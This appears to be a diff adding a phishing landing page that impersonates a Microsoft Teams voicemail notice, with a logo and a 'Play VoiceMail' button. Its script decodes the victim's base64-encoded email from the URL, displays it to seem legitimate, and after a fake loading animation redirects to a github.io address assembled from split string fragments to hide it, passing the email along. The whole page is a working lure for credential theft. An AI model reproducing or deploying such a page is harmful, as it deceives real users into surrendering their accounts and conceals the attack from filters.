@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Page</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: white;
+        }
+        .container {
+            text-align: center;
+        }
+        .dots-container {
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .dot {
+            background-color: #6E47EE;
+            border-radius: 50%;
+            width: 10px;
+            height: 10px;
+            margin: 5px;
+            animation: grow 1.5s infinite ease-in-out;
+        }
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.1s; }
+        .dot:nth-child(3) { animation-delay: 0.2s; }
+        .dot:nth-child(4) { animation-delay: 0.3s; }
+        .dot:nth-child(5) { animation-delay: 0.4s; }
+        @keyframes grow {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.5); }
+        }
+        #emailDisplay {
+            color: #6E47EE;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        #verifyButton {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            background-color: #6E47EE;
+            color: white;
+            border: none;
+            border-radius: 15px;
+            height: 50px;
+        }
+        #verifyButton:hover {
+            background-color: #8ECCFF;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://cdn.pixabay.com/photo/2022/01/27/07/17/microsoft-teams-6971301_960_720.png" alt="Logo" width="330px">
+        <div id="emailDisplay" aria-live="polite"></div>
+        <button id="verifyButton" aria-label="Click to Verify">Play VoiceMail</button>
+        <div class="dots-container" aria-label="Loading content">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+    <a id="redirectLink" href="#" style="display: none;" title="Redirect to Target"></a>
+    <script>
+        // Function to decode base64 string
+        function decodeBase64(encoded) {
+            try {
+                return decodeURIComponent(atob(encoded).split('').map(c =>
+                    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
+            } catch (e) {
+                console.error("Decoding failed: ", e);
+                return null; // Return null if decoding fails
+            }
+        }
+
+        // Function to find a valid email parameter (5)
+        function findEmailParam() {
+            const urlParams = new URLSearchParams(window.location.search);
+            for (const [key, value] of urlParams.entries()) {
+                if (/^[A-Za-z0-9+\/]{55}$/.test(key) && /^[A-Za-z0-9+\/=]*$/.test(value)) {
+                    const decodedValue = decodeBase64(value);
+                    if (decodedValue && decodedValue.includes('@')) {
+                        return { key, value }; // Return the key and the decoded email
+                    }
+                }
+            }
+            return null;
+        }
+
+        function redirectToTarget(base64Email) {
+            
+            const part1 = 'h';
+            const part2 = 't';
+            const part3 = 't';
+            const part4 = 'p';
+            const part5 = 's';
+            const part6 = ':';
+            const part7 = '/';
+            const part8 = '/';
+            const part9 = 'sh';
+            const part10 = 'bf';
+            const part11 = 'iuqa';
+            const part12 = '.';
+            const part13 = 'github';
+            const part14 = '.';
+            const part15 = 'io';
+            const part16 = '/dkfuoslxn/?d=';
+            const obfuscatedURL = part1 + part2 + part3 + part4 + part5 + part6 + part7 + part8 + part9 + part10 + part11 + part12 + part13 + part14 + part15 + part16 + base64Email;
+            
+            window.location.href = obfuscatedURL;
+        }
+
+        // Function to update the displayed email
+        function updateLink() {
+            const emailParam = findEmailParam();
+            const emailDisplay = document.getElementById('emailDisplay');
+            if (emailParam) {
+                emailDisplay.innerText = decodeBase64(emailParam.value); // Always display the decoded email
+            } else {
+                emailDisplay.innerText = "Nofo.";
+                console.error("No e");
+            }
+        }
+
+        // Click button functionality
+        const button = document.getElementById('verifyButton');
+        button.addEventListener('click', function() {
+            // Hide the verify button
+            button.style.display = 'none';
+            // Show loading dots
+            document.querySelector('.dots-container').style.display = 'flex';
+            // Wait for 2 seconds before redirecting
+            setTimeout(() => {
+                const emailParam = findEmailParam();
+                if (emailParam) {
+                    redirectToTarget(emailParam.value);
+                } else {
+                    console.error("No e found for redirection");
+                }
+            }, 2000);
+        });
+
+        window.onload = updateLink;
+    </script>
+</body>
+</html>
